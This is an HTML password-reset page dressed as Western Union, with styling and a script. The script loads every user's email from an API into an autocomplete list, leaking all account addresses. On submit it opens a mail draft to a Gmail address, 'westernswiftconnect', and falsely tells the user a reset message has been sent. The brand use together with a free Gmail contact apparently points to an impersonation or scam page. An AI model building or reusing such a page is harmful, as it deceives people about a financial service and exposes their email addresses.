<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Forgot Password - Western Union</title>

    <style>

        body {

            font-family: Arial, sans-serif;

            margin: 0;

            padding: 0;

            background: url('https://www.w3schools.com/w3images/flowers.jpg') no-repeat center center fixed;

            background-size: cover;

            color: #FFD700;

            overflow: hidden;

        }

        header {

            background-color: rgba(0, 51, 160, 0.8);

            color: #FFD700;

            padding: 30px 0;

            text-align: center;

            position: relative;

            animation: fadeIn 2s ease-in-out;

        }

        header h1 {

            margin: 0;

            font-size: 4em;

            font-weight: bold;

            animation: bounce 2s infinite;

        }

        header p {

            font-size: 1.5em;

            font-weight: bold;

        }

        .container {

            display: flex;

            justify-content: center;

            align-items: center;

            flex-direction: column;

            padding: 20px;

            margin-top: 20px;

        }

        .forgot-form {

            max-width: 500px;

            margin: 0 auto;

            padding: 20px;

            background: rgba(0, 51, 160, 0.8);

            color: white;

            border-radius: 10px;

            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);

        }

        .forgot-form h2 {

            text-align: center;

        }

        .forgot-form input {

            width: 100%;

            padding: 10px;

            margin: 10px 0;

            border: none;

            border-radius: 5px;

        }

        .forgot-form input[type="submit"] {

            background-color: #FFD700;

            color: #0033A0;

            font-size: 1.2em;

            cursor: pointer;

        }

        .forgot-form input[type="submit"]:hover {

            background-color: #e5c100;

        }

        .forgot-form a {

            display: block;

            text-align: center;

            margin-top: 20px;

            color: #FFD700;

            text-decoration: none;

            font-weight: bold;

        }

        .message {

            text-align: center;

            margin-top: 20px;

        }

        footer {

            background-color: rgba(0, 51, 160, 0.8);

            color: #FFD700;

            padding: 10px;

            text-align: center;

            position: fixed;

            bottom: 0;

            width: 100%;

        }

        @keyframes bounce {

            0%, 20%, 50%, 80%, 100% {

                transform: translateY(0);

            }

            40% {

                transform: translateY(-30px);

            }

            60% {

                transform: translateY(-15px);

            }

        }

        @keyframes fadeIn {

            from {

                opacity: 0;

            }

            to {

                opacity: 1;

            }

        }

    </style>

</head>

<body>

    <header>

        <h1>Forgot Password</h1>

        <p>Reset Your Password</p>

    </header>

    <div class="container">

        <div class="forgot-form">

            <h2>Reset Password</h2>

            <form id="forgotForm">

                <input type="email" id="email" placeholder="Enter your email" required>

                <input type="submit" value="Send Message">

            </form>

            <a href="login.html">Login</a>

            <div id="message" class="message"></div>

        </div>

    </div>

    <footer>

        &copy; 2024 Western Union. All Rights Reserved.

    </footer>

    <script>

        // Fetch user emails from the server

        async function fetchEmails() {

            try {

                const response = await fetch('/api/emails'); // Adjust the endpoint to match your server API

                if (!response.ok) throw new Error('Network response was not ok');

                

                const emails = await response.json();

                if (emails.length) {

                    document.getElementById('email').setAttribute('list', 'email-list');

                    let dataList = document.createElement('datalist');

                    dataList.id = 'email-list';

                    emails.forEach(email => {

                        let option = document.createElement('option');

                        option.value = email;

                        dataList.appendChild(option);

                    });

                    document.body.appendChild(dataList);

                }

            } catch (error) {

                console.error('Failed to fetch emails:', error);

            }

        }

        window.onload = fetchEmails;

        document.getElementById('forgotForm').addEventListener('submit', function(event) {

            event.preventDefault();

            const email = document.getElementById('email').value;

            const message = document.getElementById('message');

            fetch(`/api/check-email?email=${email}`) // Adjust the API endpoint for your email validation

                .then(response => response.json())

                .then(data => {

                    if (data.exists) {

                        const emailContent = `Dear User,\n\nWe have received a request to reset the password for the account associated with this email (${email}). If you did not make this request, please ignore this message.\n\nIf you need further assistance, please contact our support team.\n\nThank you,\nWestern union`;

                        window.location.href = `mailto:westernswiftconnect@gmail.com?subject=Password Reset Request&body=${encodeURIComponent(emailContent)}`;

                        message.textContent = `A reset message has been sent to ${email}. Please check your email for further instructions.`;

                        message.style.color = 'green';

                    } else {

                        message.textContent = 'Invalid email. Please check the email address and try again.';

                        message.style.color = 'red';

                    }

                })

                .catch(error => {

                    console.error('Error checking email:', error);

                    message.textContent = 'Something went wrong. Please try again later.';

                    message.style.color = 'red';

                });

        });

    </script>

</body>

</html>
